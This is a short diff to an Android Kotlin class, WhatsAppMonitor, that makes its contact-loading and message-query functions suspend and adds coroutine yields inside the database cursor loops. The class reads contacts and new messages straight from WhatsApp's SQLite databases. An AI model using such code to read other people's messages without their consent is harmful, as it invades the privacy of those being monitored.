@@ -289,7 +289,7 @@ class WhatsAppMonitor(
     //  Ports: load_contacts() from Python PoC
     // ═══════════════════════════════════════════════════════════
 
-    private fun loadContacts(): Map<String, String> {
+    private suspend fun loadContacts(): Map<String, String> {
         val contacts = mutableMapOf<String, String>()
         val destPath = workDir.absolutePath
 
@@ -319,6 +319,7 @@ class WhatsAppMonitor(
                 )
                 cursor.use { c ->
                     while (c.moveToNext()) {
+                        kotlinx.coroutines.yield()
                         val jid = c.getString(0) ?: continue
                         val name = c.getString(1) ?: c.getString(2) ?: continue
                         if (jid.isNotBlank() && name.isNotBlank()) {
@@ -478,7 +479,7 @@ class WhatsAppMonitor(
         val senderJid: String?
     )
 
-    private fun queryNewMessages(db: SQLiteDatabase): List<MessageRow> {
+    private suspend fun queryNewMessages(db: SQLiteDatabase): List<MessageRow> {
         // Try modern query with jid_map joins first
         try {
             return executeQuery(db, MODERN_QUERY)
@@ -496,12 +497,13 @@ class WhatsAppMonitor(
         return emptyList()
     }
 
-    private fun executeQuery(db: SQLiteDatabase, query: String): List<MessageRow> {
+    private suspend fun executeQuery(db: SQLiteDatabase, query: String): List<MessageRow> {
         val rows = mutableListOf<MessageRow>()
         val cursor = db.rawQuery(query, arrayOf(prefsManager.whatsappLastProcessedId.toString()))
 
         cursor.use { c ->
             while (c.moveToNext()) {
+                kotlinx.coroutines.yield()
                 rows.add(
                     MessageRow(
                         id = c.getLong(c.getColumnIndexOrThrow("_id")),
